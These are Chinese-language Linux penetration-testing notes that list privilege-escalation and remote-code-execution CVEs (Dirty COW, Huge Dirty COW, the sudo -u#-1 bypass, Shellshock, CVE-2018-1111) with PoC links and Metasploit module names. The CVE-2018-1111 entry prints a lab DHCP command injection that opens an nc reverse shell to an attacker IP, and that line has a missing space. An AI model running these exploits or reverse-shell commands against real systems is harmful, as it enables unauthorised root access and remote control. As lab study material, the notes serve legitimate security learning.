# Linux 渗透笔记

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

# 漏洞利用
**资源**
- []()
- []()

## 漏洞查询
**工具**
- [mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- [jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
- [InteliSecureLabs/Linux_Exploit_Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester)

---

## 提权
**CVE-2016-5195 脏牛 Dirty COW**
- 影响范围
    - Linux 内核>=2.6.22(2007年发行),直到2016年10月18日修复

- 文章
    - [[翻译]从内核角度分析 Dirty Cow 原理](https://bbs.pediy.com/thread-218797.htm)

- POC | Payload | exp
    - [scumjr/dirtycow-vdso](https://github.com/scumjr/dirtycow-vdso)
    - [dirtycow/dirtycow.github.io](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
    - [gbonacini/CVE-2016-5195](https://github.com/gbonacini/CVE-2016-5195)

**CVE-2017–1000405 Huge Dirty COW**
- 文章
    - ["Huge Dirty COW" (CVE-2017–1000405)](https://medium.com/bindecy/huge-dirty-cow-cve-2017-1000405-110eca132de0)

- POC | Payload | exp
    - [bindecy/HugeDirtyCowPOC](https://github.com/bindecy/HugeDirtyCowPOC)

**CVE-2019-14287**
- 文章
    - [How to detect CVE-2019-14287 using Falco](https://sysdig.com/blog/detecting-cve-2019-14287/)

- POC | Payload | exp
    ```bash
    cat /etc/sudoers | grep "(\s*ALL\s*,\s*\!root\s*)"
    cat /etc/sudoers | grep "(\s*ALL\s*,\s*\!#0\s*)"

    sudo -u#-1 id -u
    或者:
    sudo -u#4294967295 id -u
    ```

---

## 远程代码执行
**CVE-2014-6271** Bash 远程代码执行漏洞"破壳"
- 文章
    - [Bash远程代码执行漏洞"破壳"(CVE-2014-6271)分析](https://www.antiy.com/response/CVE-2014-6271.html)

- POC | Payload | exp
    - [scottjpack/shellshock_scanner](https://github.com/scottjpack/shellshock_scanner)

- 本地验证方法

    `env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"`

    执行命令后,如果显示 Vulnerable CVE-2014-6271,证系统存在漏洞,可改变 echo Vulnerable CVE-2014-6271 为任意命令进行执行.

- MSF 模块
    ```bash
    use exploit/linux/http/ipfire_bashbug_exec
    use exploit/multi/http/cups_bash_env_exec
    use exploit/unix/dhcp/bash_environment
    ```

**CVE-2018-1111** DHCP 客户端脚本代码执行漏洞
- 文章
    - [CVE-2018-1111 复现环境搭建与 dhcp 命令注入](https://www.freebuf.com/articles/web/191884.html)
    - [DHCP 客户端脚本代码执行漏洞分析 (CVE-2018-1111) ](https://xz.aliyun.com/t/2455)

- POC | Payload | exp
    - [ knqyf263/CVE-2018-1111](https://github.com/knqyf263/CVE-2018-1111)
    - [kkirsche/CVE-2018-1111](https://github.com/kkirsche/CVE-2018-1111)

- 本地利用方法
    ```
    attacker: kali linux 2018 x64 192.168.71.5
    victim: Centos 7 x64 192.168.71.10
    ```
    ```vim
    vim dnsmasq.conf
    bind-interfaces
    interface=eth0
    except-interface=lo
    dhcp-range=192.168.71.10,192.168.71.20,12h
    dhcp-option=3,192.168.71.5
    dhcp-option=6,192.168.71.5
    log-queries
    log-facility=/var/log/dnsmasq.log
    ```
    ```
    dnsmasq -dC dnsmasq.conf --dhcp-option="252,malayke'&nc -e /bin/bash192.168.71.5 6666 #"
    nc -l -p 6666 -v
    ```
    重启 CentOS 的网络服务,然后 shell 就反弹回来了
